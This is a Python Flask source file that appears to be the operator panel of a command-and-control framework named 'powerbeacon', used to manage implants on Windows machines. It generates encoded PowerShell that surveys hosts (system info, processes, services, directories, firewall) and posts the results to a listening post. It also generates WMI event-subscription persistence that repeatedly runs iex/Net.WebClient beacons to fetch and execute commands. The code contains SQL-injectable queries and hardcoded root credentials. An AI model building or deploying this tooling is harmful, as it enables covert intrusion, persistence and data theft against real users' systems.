#!/usr/bin/python3

from flask import Flask,render_template,request, redirect,url_for,flash
from flask_mysqldb import MySQL
import time
from base64 import b64encode

app = Flask(__name__)

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'toor'
app.config['MYSQL_DB'] = 'powerbeacon'
app.secret_key = "123"
mysql = MySQL(app)


@app.route('/',methods=['GET','POST'])
def index():
    return redirect(url_for('implants'))

@app.route('/surveyGen',methods=['GET','POST'])
def surveyGen():
    error=None
    if request.method=='POST':
        UUID=request.form['UUID']
        LP=request.form['LP']
        port=request.form['port']
        key='0000'
        notes=request.form['notes']
        try:
            systeminfo=request.form['ssl']
            use_ssl=True
        except:
            use_ssl=False
        try:
            systeminfo=request.form['systeminfo']
        except:
            systeminfo=False
        try:
            systeminfo=request.form['netstat']
        except:
            netstat=False
        try:
            ps=request.form['ps']
        except:
            ps=False
        try:
            svc=request.form['svc']
        except:
            svc=False
        try:
            dir_c=request.form['dir_c']
        except:
            dir_c=False
        try:
            dir_windows=request.form['dir_windows']
        except:
            dir_windows=False
        try:
            dir_system32=request.form['dir_system32']
        except:
            dir_system32=False
        try:
            dir_programfiles=request.form['dir_programfiles']
        except:
            dir_programfiles=False
        try:
            dir_x86=request.form['dir_x86']
        except:
            dir_x86=False
        try:
            netsh=request.form['netsh']
        except:
            netsh=False
        try:
            firewall=request.form['firewall']
        except:
            firewall=False
        try:
            firewall_rules=request.form['firewall_rules']
        except:
            firewall_rules=False

        cur = mysql.connection.cursor()
        get_key=cur.execute("SELECT implantkey from implants where (UUID='" + UUID + "')")
        get_key = cur.fetchall()
        if len(get_key) < 1:
           error="UUID Not Found"
           return render_template('surveyGen.html',error=error)
        key=get_key[0][0]   
        task = "$message=''\n"
        task = "$message='Hostname: "
        task = "$message=(hostname)\n"
        if systeminfo:
            task = task+"$message+= (systeminfo) | Out-String\n"
        if ps:
            task = task+"$message+= (get-process | select-object id, name, path) | Out-String\n"
        if svc:
            task = task+"$message+= (get-service) | Out-String\n"
        if dir_c:
            task = task+"$message+= (get-childitem c:\) | Out-String\n"
        if dir_windows:
            task = task+"$message+= (get-childitem c:\windows) | Out-String\n"
        if dir_system32:
            task = task+"$message+= (get-childitem c:\windows\system32) | Out-String\n"
        if dir_programfiles:
            task = task+"$message+= (get-childitem \"c:\program files\") | Out-String\n"
        if dir_x86:
            task = task+"$message+= (get-childitem \"c:\program files (x86)\") | Out-String\n"
        if netsh:
            task = task+"$message+= \"PortProxy Settings:\"\n"
            task = task+"$message+= (netsh interface portproxy show all) | Out-String\n"
        if firewall:
            task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
            task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
#        if firewall_rules:
#            task = task+"$message+= (get-netfirewallrule -all) | Out-String\n"
        
        
        task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n"
        if use_ssl:
            task=task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(Invoke-WebRequest -UseBasicParsing https://" + LP + ":" + port + " -ContentType \"application/json\" -Method POST -Body \"{ 'UUID':'" + UUID + "', 'key':'"+ key +"' , 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '"+ notes + "' }\")"
        else:
            task=task + "(Invoke-WebRequest -UseBasicParsing http://" + LP + ":" + port + " -ContentType \"application/json\" -Method POST -Body \"{ 'UUID':'" + UUID + "', 'key':'"+ key +"' , 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '"+ notes + "' }\")"
        
        encodedtask = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
        encodedtask = "powershell -e " + encodedtask
        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO tasks (UUID,task,notes) VALUES (%s,%s,%s)",(UUID,encodedtask,notes))
        mysql.connection.commit()
        cur.close()
        flash('Task added')
        return redirect(url_for('tasks')) 
    return render_template('surveyGen.html',error=error)


@app.route('/showCompleted',methods=['GET','POST'])
def showCompleted():
    error = None
    try:
        cur = mysql.connection.cursor()
        tasks = cur.execute("SELECT id,UUID,notes,time_complete FROM tasks where (is_complete=1) order by id desc")
        taskDetails = cur.fetchall()
        return render_template('completedtasks.html',taskDetails=taskDetails,error=error)
    except:
        error="An unknown error occured"
        return render_template('implants.html',error=error)

@app.route('/deleteTask',methods=['GET','POST'])
def deleteTask():
    error = None
    if request.method=="POST":
        try:
            id=request.form['ID']
            cur = mysql.connection.cursor()
            cur.execute("delete from tasks where (id="+id+")")
            print(id)
            mysql.connection.commit()
            cur.close()
            flash('Task Deleted')
            return redirect(url_for('tasks'))
        except:
            error = "An error has occured.  Possible duplicated UUID"
            return redirect(url_for('tasks'))
    return redirect(url_for('tasks'))

@app.route('/getData',methods=['GET','POST'])
def getData():
    error = None
    if request.method == 'POST':
        id=request.form['ID']
        cur = mysql.connection.cursor()
        cur.execute("SELECT data from datastore where (id="+id+")")
        dataDetails=cur.fetchall()
        #print(results[0])
        cur.close()
        return render_template('getData.html',error=error,dataDetails=dataDetails)

    cur = mysql.connection.cursor()
    cur.execute("SELECT id,UUID,delivered,details from datastore order by delivered desc")
    dataDetails=cur.fetchall()
    cur.close()
    return render_template('showData.html',error=error,dataDetails=dataDetails) 
    

@app.route('/tasks',methods=['GET','POST'])
def tasks():
    error = None
    if request.method == 'POST':
        UUID = request.form['UUID']
        task = request.form['task']
        notes = request.form['notes']

        try:
            cur = mysql.connection.cursor()
            cur.execute("INSERT INTO tasks (UUID,task,notes) VALUES (%s,%s,%s)",(UUID,task,notes))
            mysql.connection.commit()
            cur.close()
            flash('Task added')
            return redirect(url_for('tasks')) 
        except:
            error = "UUID NOT FOUND" 
    cur = mysql.connection.cursor()
    tasks = cur.execute("SELECT id,UUID,notes FROM tasks where is_complete = 0")

    taskDetails = cur.fetchall()
    return render_template('tasks.html',taskDetails=taskDetails,error=error)
    cur.close()

@app.route('/implants',methods=['GET','POST'])
def implants():
    error=None
    if  request.method == 'POST':
        cur = mysql.connection.cursor()
        UUID = request.form['UUID']
        print(UUID)
        implants = cur.execute("select * from allcheckins where UUID='" + UUID + "' order by calltime desc")
        implantDetails = cur.fetchall()
        return render_template('singleimplant.html',implantDetails=implantDetails,error=error)

    cur = mysql.connection.cursor()
    implants = cur.execute("select implants.UUID,implantkey, last_checkin from implants left join checkins on implants.UUID = checkins.UUID order by last_checkin desc")
    implantDetails = cur.fetchall()
    return render_template('implants.html',implantDetails=implantDetails,error=error)

@app.route('/addimplant',methods=['GET','POST'])
def addimplant():
    error=None
    
    if request.method == 'POST':
        try:
            UUID = request.form['UUID']  #getvariables
            key = request.form['key']
            notes = request.form['notes']

            cur = mysql.connection.cursor()#add to the database
            cur.execute("INSERT INTO implants (UUID,implantkey,notes) VALUES (%s,%s,%s)",(UUID,key,notes))
            cur.execute("INSERT INTO checkins (UUID) VALUES ('" + UUID + "')")
            cur.execute("update checkins set last_checkin='1990-01-01 00:00:00' where (UUID='" + UUID + "')")
            mysql.connection.commit()
            cur.close()
            flash('Implant Added')   #It's been added
            return redirect(url_for('implants'))
        except:
            error = "An error has occured.  Possible duplicated UUID"
            return render_template('addimplant.html',error=error)

    return render_template('addimplant.html',error=error)

@app.route('/updateimplant',methods=['GET','POST'])
def updateimplant():
    error=None
    
    if request.method == 'POST':
        try:
            UUID = request.form['UUID']  #getvariables
            key = request.form['key']
            interval=request.form['interval']
            ip=request.form['ip']
            port=request.form['port']
            filter=request.form['filter']
            consumer=request.form['consumer']
            interval=int(interval)
            try:
                use_ssl = request.form['ssl']
                use_ssl = True
            except:
                use_ssl = False
            if (interval < 0) or (interval > 5): 
                error = 'Invalid Interval Selected'
                return render_template('addimplant.html',error=error)
            if interval==1:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
            if interval==2:
                interval_setting="instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
            if interval==3:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
            if interval==4:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
            if interval==5:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
            if interval==0:
                interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""

            address=ip + ":" + port
            if use_ssl:
                messageblock="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\")" % (address,UUID,key)
                encodedmessage = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
                messageblock="\"powershell -e %s \"" % (encodedmessage)
            else:
                messageblock="\"powershell -command `\"iex(New-Object Net.Webclient).UploadString('http://%s', \`\"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\`\")`\"\"" % (address,UUID,key)
            data='''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
%s;
$instanceFilter.Name = "%s";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '%s' ;
$instanceConsumer.CommandLineTemplate  = %s;
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

''' % (interval_setting,filter,consumer,messageblock)

            remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""'
([wmi]$x).Delete()
''' % (filter,consumer,consumer,filter)

            data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
            remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
            flash('Update String Generated')   #It's been added
            flash('UUID: '+ UUID)   #It's been added
            flash('Key: '+ key)   #It's been added
            flash('Server IP: '+ address)   #It's been added
            flash('Filter: '+ filter)   #It's been added
            flash('Consumer: '+ consumer)   #It's been added
            flash('Invterval: '+ str(interval))   #It's been added
            return render_template('updateimplant.html',data=data,remove_data=remove_data)
        except:
            error = "An error has occured."
            return render_template('updateimplant.html',error=error,data=data,remove_data=remove_data)

    return render_template('updateimplant.html',error=error)


if __name__ == "__main__":
    app.run(debug=True)
